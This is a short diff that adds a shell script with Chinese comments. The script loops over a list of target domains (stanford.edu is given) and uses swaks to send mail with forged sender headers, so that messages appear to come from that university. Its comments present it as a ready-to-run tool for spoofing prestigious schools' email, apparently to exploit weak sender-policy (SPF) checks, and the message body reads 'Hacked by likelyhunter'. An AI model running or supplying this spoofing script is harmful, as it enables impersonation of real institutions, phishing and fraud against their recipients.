@@ -1,0 +1,8 @@
+#建立一个名为sfp_fake_email.sh的文件
+#将内容编辑为以下代码
+while IFS= read -r line; do
+    swaks --body "Hacked by likelyhunter" --header "Subject: $line Hacker" --h-From: "$line<notify@$line>" -f notify@$line -t lsq2971766035@163.com --header-X-Mailer $line
+done < domain.txt
+#再将domain.txt的内容编辑为目标名校的域名
+stanford.edu
+#之后运行即可，在我们的163邮箱中就会收到以stanford名义发来的邮件了
